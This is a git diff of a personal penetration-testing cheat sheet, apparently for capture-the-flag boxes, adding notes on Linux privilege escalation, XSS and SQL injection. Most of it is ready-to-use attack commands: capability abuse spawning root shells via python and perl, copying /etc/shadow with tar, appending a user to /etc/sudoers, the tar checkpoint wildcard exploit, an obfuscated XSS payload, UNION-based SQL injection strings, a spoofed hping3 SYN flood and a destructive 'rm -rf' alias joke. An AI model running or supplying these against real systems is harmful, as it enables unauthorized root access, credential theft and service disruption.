@@ -2,7 +2,7 @@
 
 **Box Notes**
 1. Always check /etc/sudoers.d
-2. Always check /etc/crontab
+2. Always check /etc/crontab or cd to /etc/cron.d
 but dont trust /etc/crontab >:(
 3. Always check version, kernel release, and stuff
 ```
@@ -10,19 +10,21 @@ cat /etc/*release
 uname -a 
 cat /etc/issue 
 ```
-4. Always check capabilities >>> getcap -r / 2>/dev/null
-Keep an eye on cap_setuid+ep or setuid capabilities mostly.
-If there's thing like `/usr/bin/python3 = cap_setuid+ep`
-We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`
+
 
 5. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
 6. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 7. find / -user root -perm -4000 -print 2>/dev/null
-8. find / -type f -perm -04000 -ls 2>/dev/null
+8. find / -type f -perm -04000 -ls 2>/dev/null (same like -u=s)
 
 9. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it
 
-10. when u got privesc thing just http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or just `chmod u+s /bin/bash` as root, bash -p
+10. when u got privesc thing just 
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
+- `chmod u+s /bin/bash` as root, bash -p, or 
+- `echo "[username] ALL=(ALL:ALL) ALL" >> /etc/sudoers;`
+and on and on and on
+
 11. linpeas linenum pspy name ur shits
 12. Always check `cat ~/.*history | less` or just `history`
 13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
@@ -38,6 +40,29 @@ We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.
 21. Always check `netstat -tulpn`
 22. Enum smtp with telnet.
 23. On windows, always check `whoami /priv` and find recent vulnerability.
+
+
+**Capabilities**
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+
+1. The way capabilities work is like SUID. It allows us to execute some function as root. Always check capabilities >>> getcap -r / 2>/dev/null
+Keep an eye on cap_setuid+ep or setuid capabilities mostly.
+
+## `/usr/bin/python3 = cap_setuid+ep`
+We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`
+
+## `/usr/bin/perl = cap_setuid+ep`
+Same like python, we can just do this `/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`
+
+## `/usr/bin/openssl = cap_setuid+ep`
+We can create our own OpenSSL engine in C (<openssl/engine.h>), and use the SETUID capabilities (<unistd.h>)
+Use the `openssl_setuid.c`
+
+## `/usr/bin/tar = cap_dac_read_search+ep`
+In short, we can use tar as root, so we can:
+- tar the shadow > `/usr/bin/tar cvf shadow.tar /etc/shadow`
+- extract the tar > `/usr/bin/tar xvf shadow.tar`
+- see the inside > `cat etc/shadow`
 
 
 **Gdbuss Root SSH Privesc**
@@ -65,6 +90,12 @@ echo "chmod +s /bin/bash" > exploit.sh
 2. touch /home/user/--checkpoint=1
 3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
 4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privillege
+
+
+**NFS2049**
+1. showmount -e <remote-ip>
+2. sudo mkdir /mnt/[name_of_the_mount]
+3. sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]
 
 
 **Impacket**
@@ -108,12 +139,21 @@ cat >>> can
 
 **XSS**
 1. <detail/open/ontoggle=alert()>
-2. and bunch from portswigger..
+2. 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
+𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
++(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
++𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+
+https://aem1k.com/aurebesh.js/#%3Cscript%3Eak
+
+3. ..
 
 
 **Little SQLI**
 1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
 2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -
+3. 'UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata -- - (get list of databases)
+4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -
 
 
 **Bufferoverflow**
@@ -245,7 +285,18 @@ msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
 10. alias cd='rm -rf' >> LOL DONT DO THIS
 11. ping and look at the TTL to find the target OS.
-12. 
+12. Rsa stuff
+```
+Public Key Pair: (23, 37627)                                                                          
+Private Key Pair: (61527, 37627)
+
+Public Key: ({e}, {n})
+Private Key: ({d}, {n})
+
+e = 23
+d = 61527
+n = 37627
+```
 
 
 **OSINT**
@@ -263,3 +314,5 @@ https://scylla.sh/api (Breach database) (ex = email:rudolphthered@hotmail.com, p
 ex:
 cdls(){ cd "$@" && ls; }
 i prefer just c
+2. .bashrc is the file that's executed first when you logged in to SSH, to login without activiting it do 
+`ssh -t [username]@[ip] /bin/sh`
